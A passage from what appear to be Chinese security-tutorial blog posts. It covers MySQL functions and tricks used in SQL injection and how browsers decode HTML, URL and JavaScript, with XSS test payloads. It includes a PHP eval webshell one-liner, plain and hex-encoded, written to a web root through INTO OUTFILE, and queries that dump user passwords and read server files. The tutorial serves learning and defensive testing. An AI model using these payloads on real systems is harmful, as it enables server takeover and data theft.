LOAD_FILE(CHAR(67,58,92,92,84,69,83,84,46,116,120,116))</code></strong></p>\n<blockquote>\n<p><code>CHAR(67,58,92,92,84,69,83,84,46,116,120,116)</code>得到的是<code>C:\\\\TEST.txt</code>。</p>\n</blockquote>\n</li>\n<li><p><strong><code>SELECT LOAD_FILE(0x433a5c5c544553542e747874)</code></strong></p>\n<blockquote>\n<p><code>0x433a5c5c544553542e747874</code>是<code>C:\\\\TEST.txt</code>经过十六进制编码得到的。</p>\n</blockquote>\n</li>\n</ol>\n</blockquote>\n<h3 id=\"0x03-写（导入）文件\"><a href=\"#0x03-写（导入）文件\" class=\"headerlink\" title=\"0x03 写（导入）文件\"></a>0x03 写（导入）文件</h3><p><strong>select … into outfile ‘filepath’</strong></p>\n<p><strong>select … into dumpfile ‘filepath’</strong></p>\n<blockquote>\n<p>可以把查询的行写入一个文件中。</p>\n</blockquote>\n<p><strong>使用条件</strong>：</p>\n<blockquote>\n<ol>\n<li><p>连接数据库的用户有<code>file_priv</code>权限，且启动<code>mysqld</code>的用户对目录需要有写权限。</p>\n</li>\n<li><p>文件路径必须为绝对路径，<code>file_name</code>不能是一个已经存在的文件。</p>\n</li>\n<li><p>如果<code>secure_file_priv</code>非NULL，则只能读取对应目录下的文件。当<code>secure_file_priv</code>的值为NULL ，表示限制<code>mysqld</code>不允许导入|导出。当<code>secure_file_priv</code>的值为空白，表示可以导入任意目录。</p>\n<blockquote>\n<p><code>show  variables like &quot;secure_file%&quot;;</code></p>\n</blockquote>\n</li>\n</ol>\n</blockquote>\n<p><strong>写入Webshell条件</strong>：</p>\n<blockquote>\n<ol>\n<li>需要知道网站的绝对物理路径，这样导出后的webshell可访问。</li>\n<li>写入的目录有写权限。</li>\n<li><code>secure_file_priv</code>非NULL且包含了WEB路径。</li>\n</ol>\n</blockquote>\n<p><strong>写入Webshell</strong>：</p>\n<blockquote>\n<ul>\n<li><strong><code>select &quot;&lt;?php @eval($_POST[sh4douu])?&gt;&quot;  into outfile &quot;X:\\\\phpstudy\\\\PHPTutorial\\\\WWW\\\\shell.php&quot;;</code></strong></li>\n<li><strong><code>select &quot;&lt;?php @eval($_POST[sh4douu])?&gt;&quot;  into dumpfile &quot;X:\\\\phpstudy\\\\PHPTutorial\\\\WWW\\\\shell.php&quot;;</code></strong></li>\n</ul>\n</blockquote>\n<p><strong>LINES TERMINATED BY</strong></p>\n<p>用于不是<code>Union Select</code>时。</p>\n<blockquote>\n<ol>\n<li><p>使用格式：</p>\n<blockquote>\n<p><strong><code>Select version() into outfile &#39;X:/phpstudy/PHPTutorial/WWW/shell.php&#39; LINES TERMINATED BY [十六进制数据]</code></strong></p>\n</blockquote>\n</li>\n<li><p>例子：</p>\n<blockquote>\n<p><strong><code>Select user From mysql.user where user=&quot;root&quot; limit 1 into outfile &#39;X:/phpstudy/PHPTutorial/WWW/shell.php&#39; LINES TERMINATED BY 0x3C3F70687020406576616C28245F504F53545B736834646F75755D293F3E;</code></strong></p>\n<blockquote>\n<p>0x3C3F70687020406576616C28245F504F53545B736834646F75755D293F3E是经过十六进制编码后的<code>&lt;?php @eval($_POST[sh4douu])?&gt;</code>，<code>Lines Terminated By</code>就是在查询到的数据最后再加入指定的数据然后一并写到文件中。如下图，查询到数据为<code>root</code>，之后的一句话木马是<code>Lines Terminated By</code>之后的十六进制数据解码得到的字符。</p>\n</blockquote>\n</blockquote>\n</li>\n<li><p>此外还有<code>FIELDS TERMINATED BY</code>也是类似功能，它是在查询到的数据之间插入数据，但如果查询的数据只有一列，那么将不会被插入数据。</p>\n</li>\n</ol>\n</blockquote>\n<p><img src=\"/2019/03/12/0x00-SQL注入系列之Mysql基础知识/QQ截图20190312143549.png\" alt></p>\n<p><strong>dumpfile与outfile区别</strong>：</p>\n<ol>\n<li><code>outfile</code> 可以导出每行。<code>dumpfile</code> 只能导出一行（将目标文件写入同一行内；</li>\n<li><code>outfile</code>不可导出二进制文件，文件会被破坏，转义等。<code>dumpfile</code>可导出完整可执行二进制文件。</li>\n</ol>\n<h3 id=\"0x04-Union-Select\"><a href=\"#0x04-Union-Select\" class=\"headerlink\" title=\"0x04 Union Select\"></a>0x04 Union Select</h3><p><code>UNION</code>操作符用于合并两个或多个<code>SELECT</code>语句的结果集。</p>\n<p><code>UNION</code>只是将两个查询结果联结起来在一列显示，并不是联结两个表。</p>\n<p><code>UNION ALL</code>和<code>UNION</code>不同之处在于<code>UNION ALL</code>会将所有符合条件的都列出来，既不去重复的值。而<code>UNION</code>去重。</p>\n<p><strong>使用条件</strong>：</p>\n<blockquote>\n<ol>\n<li>UNION 内部的 SELECT 语句必须拥有相同数量的列。</li>\n<li>列也必须拥有相似的数据类型。</li>\n<li>每条 SELECT 语句中的列的顺序必须相同。</li>\n</ol>\n</blockquote>\n<p><img src=\"/2019/03/12/0x00-SQL注入系列之Mysql基础知识/QQ截图20190318142002.png\" alt></p>\n<p><strong>Order by</strong></p>\n<p><code>ORDER BY</code>语句用于根据指定的列对结果集进行排序。</p>\n<p>在SQLi中，<code>order by</code>用于寻找查询的列数，因为根据前面我们知道<code>union select</code>使用条件之一是要列数相等。</p>\n<p><code>order by</code>之后可以跟一个数字，当数字大于查询的列数时，就会报错。由此可以得知，<code>order by</code>允许接的最大数字就是实际查询的列数。</p>\n<p><img src=\"/2019/03/12/0x00-SQL注入系列之Mysql基础知识/QQ截图20190318142657.png\" alt></p>\n<h3 id=\"0x05-注释\"><a href=\"#0x05-注释\" class=\"headerlink\" title=\"0x05 注释\"></a>0x05 注释</h3><p><strong>行间注释：</strong></p>\n<ul>\n<li><strong><code>--+</code></strong>（–之后一个空格）</li>\n<li><strong><code>#</code></strong>（浏览器访问时需要编码成%23，否则被当作锚点起始）</li>\n<li><code>；%00</code>(空字节)</li>\n<li><em>`</em>(反引号)</li>\n</ul>\n<p><strong>行内注释：</strong></p>\n<ul>\n<li><strong><code>/*注释*/</code></strong></li>\n<li>Mysql中，<code>/*! SQL 语句 */</code> 这种格式里面的 SQL 语句会当正常的语句一样被解析。</li>\n</ul>\n","site":{"data":{}},"excerpt":"<h2 id=\"一、MySQLi常用函数\"><a href=\"#一、MySQLi常用函数\" class=\"headerlink\" title=\"一、MySQLi常用函数\"></a>一、MySQLi常用函数</h2><h3 id=\"0x00-系统函数\"><a href=\"#0x00-系统函数\" class=\"headerlink\" title=\"0x00 系统函数\"></a>0x00 系统函数</h3><ul>\n<li><strong><code>@@version_compile_os</code></strong>：操作系统版本</li>\n<li><strong><code>@basedir</code></strong>：MySQL安装路径</li>\n<li><strong><code>version()</code></strong>：MySQL版本</li>\n<li><strong><code>user()</code></strong>：当前数据库用户</li>\n<li><strong><code>@@datadir</code></strong>：数据库路径</li>\n<li><strong><code>database()</code></strong>：当前所处数据库名</li>\n</ul>","more":"<p><img src=\"/2019/03/12/0x00-SQL注入系列之Mysql基础知识/QQ截图20190312102557.png\" alt></p>\n<h3 id=\"0x01-字符串拼接函数\"><a href=\"#0x01-字符串拼接函数\" class=\"headerlink\" title=\"0x01 字符串拼接函数\"></a>0x01 字符串拼接函数</h3><ul>\n<li><strong><code>Concat()</code></strong></li>\n<li><strong><code>Concat_WS()</code></strong></li>\n<li><strong><code>GROUP_CONCAT()</code></strong></li>\n</ul>\n<blockquote>\n<p>在MySQLi中，拼接函数的作用在于将多行数据合并为一行，因为在注入中有时候能显示的行数是有限的。</p>\n</blockquote>\n<p><strong>1.Concat(str1,str2,…)</strong></p>\n<p>返回结果为拼接参数得到的字符串。</p>\n<p>如有任何一个参数为NULL,则返回值为NULL。可以有一个或多个参数。</p>\n<p><img src=\"/2019/03/12/0x00-SQL注入系列之Mysql基础知识/01.png\" alt></p>\n<ul>\n<li><strong><code>select concat(user,&quot;,&quot;,password) from mysql.user;</code></strong></li>\n</ul>\n<p><img src=\"/2019/03/12/0x00-SQL注入系列之Mysql基础知识/02.png\" alt></p>\n<p><strong>2.Concat_WS(separator,str1,str2,…)</strong></p>\n<p><code>separator</code>为拼接字符串之间的分隔符。</p>\n<p><img src=\"/2019/03/12/0x00-SQL注入系列之Mysql基础知识/03.png\" alt></p>\n<p><img src=\"/2019/03/12/0x00-SQL注入系列之Mysql基础知识/04.png\" alt></p>\n<p><strong>3.GROUP_CONCAT()</strong></p>\n<p><img src=\"/2019/03/12/0x00-SQL注入系列之Mysql基础知识/QQ截图20190312110721.png\" alt></p>\n<p>将DBMS中所有数据库名作为一列返回：</p>\n<ul>\n<li><strong><code>select group_concat(schema_name) from information_schema.schemata;</code></strong></li>\n</ul>\n<p>将指定数据库的所有表名作为一列返回：</p>\n<ul>\n<li><strong><code>select group_concat(table_name) from information_schema.tables where table_schema=&#39;db_name&#39;;</code></strong></li>\n</ul>\n<p>将指定数据表的所有列名作为一列返回：</p>\n<ul>\n<li><strong><code>select group_concat(column_name) from information_schema.columns where table_name=&#39;tb_name&#39;;</code></strong></li>\n</ul>\n<h3 id=\"0x02-字符-数字函数\"><a href=\"#0x02-字符-数字函数\" class=\"headerlink\" title=\"0x02 字符/数字函数\"></a>0x02 字符/数字函数</h3><ul>\n<li><strong><code>ASCII()</code></strong>: 返回字符对应的ASCII码值。</li>\n<li><strong><code>ORD()</code></strong>：返回字符对应的ASCII码值。</li>\n<li><strong><code>CHAR()</code></strong>：返回数字对应的ASCII字符。</li>\n</ul>\n<p><img src=\"/2019/03/12/0x00-SQL注入系列之Mysql基础知识/05.png\" alt></p>\n<ul>\n<li><strong><code>BIN()</code></strong>: 返回数字对应的二进制串。</li>\n<li><strong><code>CONV(Num,from_base,to_base)</code></strong>: 数字进制转换。</li>\n</ul>\n<p><img src=\"/2019/03/12/0x00-SQL注入系列之Mysql基础知识/06.png\" alt></p>\n<ul>\n<li><strong><code>HEX()</code></strong>:十六进制编码</li>\n<li><strong><code>UNHEX()</code></strong>：十六进制解码</li>\n</ul>\n<p><img src=\"/2019/03/12/0x00-SQL注入系列之Mysql基础知识/07.png\" alt></p>\n<ul>\n<li><strong><code>FLOOR()</code></strong>：向下取整</li>\n<li><strong><code>RAND()</code></strong>：用于产生一个0~1的随机数</li>\n</ul>\n<p><img src=\"/2019/03/12/0x00-SQL注入系列之Mysql基础知识/08.png\" alt></p>\n<ul>\n<li><strong><code>LOWER()</code></strong>：转成小写字母</li>\n<li><strong><code>UPPER()</code></strong>: 转成大写字母</li>\n</ul>\n<h3 id=\"0x03-字符串切片函数\"><a href=\"#0x03-字符串切片函数\" class=\"headerlink\" title=\"0x03 字符串切片函数\"></a>0x03 字符串切片函数</h3><ul>\n<li><strong><code>MID(string，start，count)</code></strong>：从字符串下标为<code>start</code>处开始切取<code>count</code>个字符（下标从1开始）。</li>\n<li><strong><code>SUBSTR()</code></strong>：同上。</li>\n<li><strong><code>SUBSTRING()</code></strong>：同上。</li>\n<li><strong><code>LEFT(string, n)</code></strong>：获取从字符串左边开始的指定n个字符。</li>\n</ul>\n<p><img src=\"/2019/03/12/0x00-SQL注入系列之Mysql基础知识/09.png\" alt></p>\n<h3 id=\"0x04-盲注相关函数\"><a href=\"#0x04-盲注相关函数\" class=\"headerlink\" title=\"0x04 盲注相关函数\"></a>0x04 盲注相关函数</h3><ul>\n<li><strong><code>sleep(n)</code></strong>：阻塞n秒。</li>\n<li><strong><code>len()</code></strong>：返回字符串的长度。</li>\n<li><strong><code>if(expr1,expr2,expr3)</code></strong>：如果expr1是TRUE ，则值为expr2; 否则为 expr3。</li>\n</ul>\n<h3 id=\"0x05-读文件-Load-file\"><a href=\"#0x05-读文件-Load-file\" class=\"headerlink\" title=\"0x05 读文件 Load_file()\"></a>0x05 读文件 Load_file()</h3><blockquote>\n<p>读取文件并返回该文件的内容作为一个字符串，读取失败返回NULL。</p>\n</blockquote>\n<p><strong>使用条件</strong>：</p>\n<blockquote>\n<ol>\n<li><p>连接数据库的用户有<code>file_priv</code>权限，启动<code>mysqld</code>用户必须拥有对此文件读取的权限。</p>\n<blockquote>\n<p>查看用户的<code>file_priv</code>权限：<code>select User,File_priv from mysql.user;</code></p>\n</blockquote>\n</li>\n<li><p>欲读取文件必须在服务器上。</p>\n</li>\n<li><p>必须指定文件的绝对路径。</p>\n</li>\n<li><p>欲读取文件必须小于 max_allowed_packet。</p>\n<blockquote>\n<p>查看允许最大包长度：<code>show global variables like &quot;max_allow%&quot;;</code></p>\n</blockquote>\n</li>\n<li><p>如果<code>secure_file_priv</code>非NULL，则只能读取对应目录下的文件。当<code>secure_file_priv</code>的值为NULL ，表示限制<code>mysqld</code>不允许导入|导出。</p>\n<blockquote>\n<p>查看允许读取的路径：<code>show  variables like &quot;secure_file%&quot;;</code></p>\n</blockquote>\n</li>\n</ol>\n</blockquote>\n<p><strong>使用例子：</strong></p>\n<blockquote>\n<p> 注意路径符号的处理，要么使用<code>/</code>，使用Windows的<code>\\</code>需要进行转义，即<code>\\\\</code>。</p>\n<ol>\n<li><p><strong><code>SELECT LOAD_FILE(&quot;C://TEST.txt&quot;)</code></strong></p>\n</li>\n<li><p><strong><code>SELECT LOAD_FILE(&quot;C:/TEST.txt&quot;)</code></strong></p>\n</li>\n<li><p><strong><code>SELECT LOAD_FILE(&quot;C:\\\\TEST.txt&quot;)</code></strong></p>\n</li>\n<li><p><strong><code>SELECT LOAD_FILE(CHAR(67,58,92,92,84,69,83,84,46,116,120,116))</code></strong></p>\n<blockquote>\n<p><code>CHAR(67,58,92,92,84,69,83,84,46,116,120,116)</code>得到的是<code>C:\\\\TEST.txt</code>。</p>\n</blockquote>\n</li>\n<li><p><strong><code>SELECT LOAD_FILE(0x433a5c5c544553542e747874)</code></strong></p>\n<blockquote>\n<p><code>0x433a5c5c544553542e747874</code>是<code>C:\\\\TEST.txt</code>经过十六进制编码得到的。</p>\n</blockquote>\n</li>\n</ol>\n</blockquote>\n<h3 id=\"0x03-写（导入）文件\"><a href=\"#0x03-写（导入）文件\" class=\"headerlink\" title=\"0x03 写（导入）文件\"></a>0x03 写（导入）文件</h3><p><strong>select … into outfile ‘filepath’</strong></p>\n<p><strong>select … into dumpfile ‘filepath’</strong></p>\n<blockquote>\n<p>可以把查询的行写入一个文件中。</p>\n</blockquote>\n<p><strong>使用条件</strong>：</p>\n<blockquote>\n<ol>\n<li><p>连接数据库的用户有<code>file_priv</code>权限，且启动<code>mysqld</code>的用户对目录需要有写权限。</p>\n</li>\n<li><p>文件路径必须为绝对路径，<code>file_name</code>不能是一个已经存在的文件。</p>\n</li>\n<li><p>如果<code>secure_file_priv</code>非NULL，则只能读取对应目录下的文件。当<code>secure_file_priv</code>的值为NULL ，表示限制<code>mysqld</code>不允许导入|导出。当<code>secure_file_priv</code>的值为空白，表示可以导入任意目录。</p>\n<blockquote>\n<p><code>show  variables like &quot;secure_file%&quot;;</code></p>\n</blockquote>\n</li>\n</ol>\n</blockquote>\n<p><strong>写入Webshell条件</strong>：</p>\n<blockquote>\n<ol>\n<li>需要知道网站的绝对物理路径，这样导出后的webshell可访问。</li>\n<li>写入的目录有写权限。</li>\n<li><code>secure_file_priv</code>非NULL且包含了WEB路径。</li>\n</ol>\n</blockquote>\n<p><strong>写入Webshell</strong>：</p>\n<blockquote>\n<ul>\n<li><strong><code>select &quot;&lt;?php @eval($_POST[sh4douu])?&gt;&quot;  into outfile &quot;X:\\\\phpstudy\\\\PHPTutorial\\\\WWW\\\\shell.php&quot;;</code></strong></li>\n<li><strong><code>select &quot;&lt;?php @eval($_POST[sh4douu])?&gt;&quot;  into dumpfile &quot;X:\\\\phpstudy\\\\PHPTutorial\\\\WWW\\\\shell.php&quot;;</code></strong></li>\n</ul>\n</blockquote>\n<p><strong>LINES TERMINATED BY</strong></p>\n<p>用于不是<code>Union Select</code>时。</p>\n<blockquote>\n<ol>\n<li><p>使用格式：</p>\n<blockquote>\n<p><strong><code>Select version() into outfile &#39;X:/phpstudy/PHPTutorial/WWW/shell.php&#39; LINES TERMINATED BY [十六进制数据]</code></strong></p>\n</blockquote>\n</li>\n<li><p>例子：</p>\n<blockquote>\n<p><strong><code>Select user From mysql.user where user=&quot;root&quot; limit 1 into outfile &#39;X:/phpstudy/PHPTutorial/WWW/shell.php&#39; LINES TERMINATED BY 0x3C3F70687020406576616C28245F504F53545B736834646F75755D293F3E;</code></strong></p>\n<blockquote>\n<p>0x3C3F70687020406576616C28245F504F53545B736834646F75755D293F3E是经过十六进制编码后的<code>&lt;?php @eval($_POST[sh4douu])?&gt;</code>，<code>Lines Terminated By</code>就是在查询到的数据最后再加入指定的数据然后一并写到文件中。如下图，查询到数据为<code>root</code>，之后的一句话木马是<code>Lines Terminated By</code>之后的十六进制数据解码得到的字符。</p>\n</blockquote>\n</blockquote>\n</li>\n<li><p>此外还有<code>FIELDS TERMINATED BY</code>也是类似功能，它是在查询到的数据之间插入数据，但如果查询的数据只有一列，那么将不会被插入数据。</p>\n</li>\n</ol>\n</blockquote>\n<p><img src=\"/2019/03/12/0x00-SQL注入系列之Mysql基础知识/QQ截图20190312143549.png\" alt></p>\n<p><strong>dumpfile与outfile区别</strong>：</p>\n<ol>\n<li><code>outfile</code> 可以导出每行。<code>dumpfile</code> 只能导出一行（将目标文件写入同一行内；</li>\n<li><code>outfile</code>不可导出二进制文件，文件会被破坏，转义等。<code>dumpfile</code>可导出完整可执行二进制文件。</li>\n</ol>\n<h3 id=\"0x04-Union-Select\"><a href=\"#0x04-Union-Select\" class=\"headerlink\" title=\"0x04 Union Select\"></a>0x04 Union Select</h3><p><code>UNION</code>操作符用于合并两个或多个<code>SELECT</code>语句的结果集。</p>\n<p><code>UNION</code>只是将两个查询结果联结起来在一列显示，并不是联结两个表。</p>\n<p><code>UNION ALL</code>和<code>UNION</code>不同之处在于<code>UNION ALL</code>会将所有符合条件的都列出来，既不去重复的值。而<code>UNION</code>去重。</p>\n<p><strong>使用条件</strong>：</p>\n<blockquote>\n<ol>\n<li>UNION 内部的 SELECT 语句必须拥有相同数量的列。</li>\n<li>列也必须拥有相似的数据类型。</li>\n<li>每条 SELECT 语句中的列的顺序必须相同。</li>\n</ol>\n</blockquote>\n<p><img src=\"/2019/03/12/0x00-SQL注入系列之Mysql基础知识/QQ截图20190318142002.png\" alt></p>\n<p><strong>Order by</strong></p>\n<p><code>ORDER BY</code>语句用于根据指定的列对结果集进行排序。</p>\n<p>在SQLi中，<code>order by</code>用于寻找查询的列数，因为根据前面我们知道<code>union select</code>使用条件之一是要列数相等。</p>\n<p><code>order by</code>之后可以跟一个数字，当数字大于查询的列数时，就会报错。由此可以得知，<code>order by</code>允许接的最大数字就是实际查询的列数。</p>\n<p><img src=\"/2019/03/12/0x00-SQL注入系列之Mysql基础知识/QQ截图20190318142657.png\" alt></p>\n<h3 id=\"0x05-注释\"><a href=\"#0x05-注释\" class=\"headerlink\" title=\"0x05 注释\"></a>0x05 注释</h3><p><strong>行间注释：</strong></p>\n<ul>\n<li><strong><code>--+</code></strong>（–之后一个空格）</li>\n<li><strong><code>#</code></strong>（浏览器访问时需要编码成%23，否则被当作锚点起始）</li>\n<li><code>；%00</code>(空字节)</li>\n<li><em>`</em>(反引号)</li>\n</ul>\n<p><strong>行内注释：</strong></p>\n<ul>\n<li><strong><code>/*注释*/</code></strong></li>\n<li>Mysql中，<code>/*! SQL 语句 */</code> 这种格式里面的 SQL 语句会当正常的语句一样被解析。</li>\n</ul>"},{"title":"XSS学习系列Chapter 1：浏览器解析HTML文档","date":"2019-03-07T03:59:02.000Z","_content":"\n## 一、前端基本编码知识\n\n### 0x00 为什么要进行编码?\n\n> 主要是因为某些数据不适合传输。原因多种多样，如Size过大，包含隐私数据，另外重要的一点就是有些字符会**引起歧义**。\n\n对于URL，\n\n> `&`用于分割多个参数，倘若有某个参数键值对为`name=v&lue`，就会因为`name`参数的值`v&lue`中携带了`&`而造成歧义。因此需要对`&`进行URL编码。\n\n对于HTML，\n\n> 当浏览器遇到`<`会识别为元素定义的开始，`>`会识别为元素的结束。倘若有`<div  id=\"1>\" ></div>`，由于标签的属性值携带了`>`，同样会造成歧义。因此需要属性值的`>`需要进行HTML编码，即使用字符实体。\n\n<!-- more -->\n\n### 0x01 URL编码\n\n> RFC3986文档规定，Url中只允许包含英文字母（a-zA-Z）、数字（0-9）、-_.~4个特殊字符以及所有保留字符。\n\n编码方式，\n\n> `%`加`字符在ASCII码表中的十六进制值`。\n>\n> 例如，`/`在ASCII码表中十六进制为`0x2f`，那么它对应的URL编码为`%2f`。\n\nJavaScript中提供了3个函数用来对Url编码以得到合法的Url：\n\n- escape()\n- encodeURI（）\n- encodeURIComponent（）\n\n参考连接：https://www.cnblogs.com/jerrysion/p/5522673.html\n\n### 0x02 HTML编码（字符实体）\n\n字符实体是一个预先定义好的转义序列。\n\n字符实体两种表示方法:\n\n> - 字符实体以`&`开头+预先定义的`实体名称`+`;`分号结束，如“<”的实体名称为`&lt;`\n> - 字符实体还可以以`&`开头+`#`符号+`字符在ASCII对应的十进制数字`+`;`分号结束，如`<`的实体编号为`&#60;`。\n\n**字符都是有实体编号的，但有些字符是没有实体名称的。**\n\n![](0x00-XSS学习系列之解析HTML文档\\QQ截图20190307120011.png)\n\n### 0x03 JavaScript编码\n\n最常用的如`\\uXXXX`这种写法的Unicode转义序列，表示一个字符，其中`xxxx`表示一个16进制数字，如`<`Unicode编码为`\\u003c`。\n\n## 二、解析HTML文档\n\n解析一个HTML文档涉及三个主要过程：HTML解析——>URL解析——JavaScript解析。\n\n每一个过程由相应的解析器进行解码解析：HTML解析器、URL解析器、JavaScript解析器。\n\n### 0x00 HTML解析器\n\nHTML解析器以状态机的方式运行，它从文档输入流中消耗字符并根据其转换规则转换到不同的状态。\n\n> 当HTML解析器遇到`<`字符，且字符后不包含`/`,即不是闭合标签时，状态机就会进入**`标签打开状态（Tag Open State）`**，随后再进入**`标签名称状态（Tag Name State）`**、**`属性名称前状态（Before Attribute Name State）`**......最后进入**`数据状态（Data State）`**并且发布当前**`标签令牌（Token）`**。状态机处于**`数据状态（Data State）`**时，会继续上述的步骤，遇到完整的标签就发出**`标签令牌（Token）`**。\n\nHTML解析器处于**`数据状态（Data State）`**、**`RCDATA 状态（RCDATA State）`**、**`属性值状态（Attribute Value State）`**时，**字符实体**会被解码为对应的字符。\n\n例子，\n\n> **`<div>&#60;img src=x onerror=alert(4)&#62;</div>`**\n>\n> `<`和`>`被编码为字符实体`&#60;`和`&#62;`。\n>\n> 当HTML解析器解析完`<div>`时，会进入**`数据状态（Data State）`**并发布标签令牌。接着解析到实体`&#60;`时因为处在**`数据状态（Data State）`**就会对实体进行解码为`<`，后面的`&#62;`同样道理被解码为`>`。\n\n这里会有个问题，被解码后，`img`是否会被解析为HTML标签而导致JS执行呢？\n\n> 答案是否定的。因为解析器在使用字符引用后不会转换到**`标签打开状态（Tag Open State）`**，不进入标签打开状态就不会被发布为HTML标签。因此，不会创建新HTML标签，只会将其作为数据来处理。\n>\n> **这也是为什么我们可以使用字符实体来避免用户不安全输入导致XSS的原因。**\n\n**RCDATA**\n\n在HTML中，属于**`RCDATA Elements`**的标签有两个：`textarea`、`title`。\n\n**`RCDATA Elements`**类型的标签可以包含文本内容和字符实体。\n\n解析器解析到`textarea`、`title`标签的数据部分时，状态会进入**`RCDATA State`**。\n\n前面我们提到，处于**`RCDATA State`**状态时，字符实体是会被解析器解码的。\n\n例子， \n\n> **`<textarea>&#60;script&#62;alert(5)&#60;/script&#62;</textarea>`**\n>\n> `<`和`>`被编码为实体`&#60;`和`&#62;`。\n>\n> 解析器解析到它们时会进行解码，最终得到**`<textarea><script>alert(5)</script></textarea>`**。但是里面的JS同样还是不会被执行，原因还是因为解码字符实体状态机不会进入**`标签打开状态（Tag Open State）`**，因此里面的`<script>`并不会被解析为HTML标签。\n\n事实上，任何`RCDATA`（`textarea`、`title`里面的数据）都不会使得状态机进入**`标签打开状态（Tag Open State）`**，So if a user input wants to escape out of the CDATA context, it has to use the exact \"]]>\" sequence without any encoding。\n\nHTML解析规范：https://html.spec.whatwg.org/multipage/parsing.html#tokenization\n\n### 0x01 URL解析器\n\nURL解析器也被建模为状态机，文档输入流中的字符可以将其导向不同的状态。\n\n首先，要注意的是URL的`Scheme`部分（协议部分）必须为ASCII字符，即不能被任何编码，否则URL解析器的状态机将进入**`No Scheme`**状态。\n\n例如，\n\n> **` <a href=\"%6a%61%76%61%73%63%72%69%70%74:%61%6c%65%72%74%28%31%29\"></a>`**\n>\n> URL编码部分的是`javascript:alert(1)`。\n>\n> JS不会被执行，因为作为`Scheme`部分的`\"javascript\"`这个字符串被编码，导致URL解析器状态机进入**`No Scheme`**状态。\n\n同样，URL中的`:`也不能被以任何方式编码，否则URL解析器的状态机也将进入**`No Scheme`**状态。\n\n例如，\n\n> **`<a href=\"javascript%3aalert(3)\"></a>`**\n>\n> 由于`:`被URL编码为`%3a`，导致URL状态机进入**`No Scheme`**状态，JS代码不能执行。\n\n另一个例子：\n\n**`<a href=\"&#x6a;&#x61;&#x76;&#x61;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;:%61%6c%65%72%74%28%32%29\">`**\n\n`\"javascript\"`这个字符串被实体化编码，`:`没有被编码,`alert(2)`被URL编码。\n\n例子中的JS被成功执行。那么将产生一个问题。为什么作为URL的`Scheme`部分的`\"javascript\"`这个字符串被编码了但JS还是被执行了？\n\n> 原因在于，首先，在HTML解析器中我们谈到过，HTML状态机处于**`属性值状态（Attribute Value State）`**时，字符实体时会被解码的，此处在`href`属性中，所以被实体化编码的`\"javascript\"`字符串会被解码。其次，HTML解析是在URL解析之前的，所以在进行URL解析之前，`Scheme`部分的`\"javascript\"`字符串已被解码，而并不再是被实体编码的状态。\n\nURL解析规范：https://url.spec.whatwg.org/\n\nURL地址结构：https://blog.csdn.net/x_nirvana/article/details/50768906\n\n### 0x02 JavaScript解析器\n\nJavaScript解析与HTML解析的区别在于JavaScript是上下文自由的。\n\n在HTML中，属于**`Raw text elements`**的标签有两个：`script`、`style`。\n\n在**`Raw text elements`**类型标签下的所有内容块都属于该标签。\n\n存在一条特性：\n\n> 即**`Raw text elements`**类型标签下的所有字符实体编码都不会被HTML解码。HTML解析器解析到`script`、`style`标签的内容块（数据）部分时，状态会进入**`Script Data State`**，该状态并不在我们前面说的会解码字符实体的三条状态之中。\n\n因此，**`<script>&#97;&#108;&#101;&#114;&#116&#40;&#57;&#41;&#59</script>`**这样字符实体并不会被解码，也就不会执行JS。\n\n形如 `\\uXXXX`这样的Unicode字符转义序列或Hex编码是否能被解码需要看情况。\n\n首先，JavaScript中有三个地方可以出现Unicode字符转义序列：\n\n字符串中（in String）\n\n> `Unicode escape sequences will NEVER break out of the string context in JavaScript because they will always be interpreted as string literals.`\n>\n> 即，Unicode转义序列出现在字符串中时，它只会被解释为普通字符，而不会破坏字符串的上下文。例如`\\u000A`在Java字符串中会被解释为行终止符，会导致字符串上下文断裂。但在JavaScript中的字符串只会被解释为普通字符。简单说就是会被解码，但只解释为字符串的一部分。\n\n标识符中（in identifier names）\n\n> 若Unicode转义序列存在于标识符中，即变量名（如函数名等...），它会被进行解码。\n>\n> 例如，**`<script>\\u0061\\u006c\\u0065\\u0072\\u0074(10);</script>`**\n>\n> 被编码转义的部分为`alert`字符，是函数名，属于在标识符中的情况，因此会被正常解码，JS代码也会被执行。\n\n控制字符中（in control characters）\n\n> 若Unicode转义序列存在于控制字符中，那么它会被解码但不会被解释为控制字符，而会被解释为标识符或字符串字符的一部分。\n>\n> 控制字符即`'`、`\"`、`()`等。\n>\n> 例如，**`<script> alert\\u0028\"xss\"); </script>`**，`(`进行了Unicode编码，那么解码后它不再是作为控制字符，而是作为标识符的一部分`alert(`。\n>\n> 因此函数的括号之类的控制字符进行Unicode转义后是不能被正常解码解释的。\n\n总结，Unicode序列只有出现在标识符中时，才能被正常的解码解释。\n\n例子，\n\n> **`<script>\\u0061\\u006c\\u0065\\u0072\\u0074\\u0028\\u0031\\u0031\\u0029</script>`**\n>\n> 被编码部分为`alert(11)`。\n>\n> 该例子中的JS不会被执行，因为控制字符被编码了。\n\n> **` <script>\\u0061\\u006c\\u0065\\u0072\\u0074(\\u0031\\u0032)</script>`**\n>\n> 被编码部分为`alert`及括号内为`12`。\n>\n> 该例子中JS不会被执行，原因在于括号内被编码的部分不能被正常解码解释，要么使用ASCII数字，要么加`\"\"`或`''`使其变为字符串，作为字符串也只能作为普通字符。\n\n> **`<script>alert('13\\u0027)</script>`**\n>\n> 被编码处为`'`。\n>\n> 该例的JS不会执行，因为控制字符被编码了，解码后的`'`将变为字符串的一部分，而不再解释为控制字符。因此该例中字符串是不完整的，因为没有`'`来结束字符串。\n\n> **`<script>alert('14\\u000a')</script>`**\n>\n> 该例的JS会被执行，因为被编码的部分处于字符串内，只会被解释为普通字符，不会突破字符串上下文。\n\n### 0x03 解析顺序\n\n首先浏览器接收到一个HTML文档时，会触发HTML解析器对HTML文档进行词法解析，这一过程完成HTML解码并创建DOM树，接下来JavaScript解析器会介入对内联脚本进行解析，这一过程完成JS的解码工作，如果浏览器遇到需要URL的上下文环境，这时URL解析器也会介入完成URL的解码工作，URL解析器的解码顺序会根据URL所在位置不同，可能在JavaScript解析器之前或之后解析。HTML解析总是第一步。\n\nURL解析和JavaScript解析，它们的解析顺序要根据情况而定。\n\n例子，\n\n> **`<a href=\"UserInput\"></a>`**\n>\n> 该例子中，首先由HTML解析器对`UserInput`部分进行字符实体解码；\n>\n> 接着URL解析器对`UserInput`进行URL decode；\n>\n> 如果URL的Scheme部分为`javascript`的话，JavaScript解析器会再对`UserInput`进行解码。\n>\n> 所以解析顺序是：HTML解析——>URL解析——>JavaScript解析。\n\n> **`<a href=# onclick=\"window.open('UserInput')\"></a>`**\n>\n> 该例子中，首先由HTML解析器对`UserInput`部分进行字符实体解码；\n>\n> 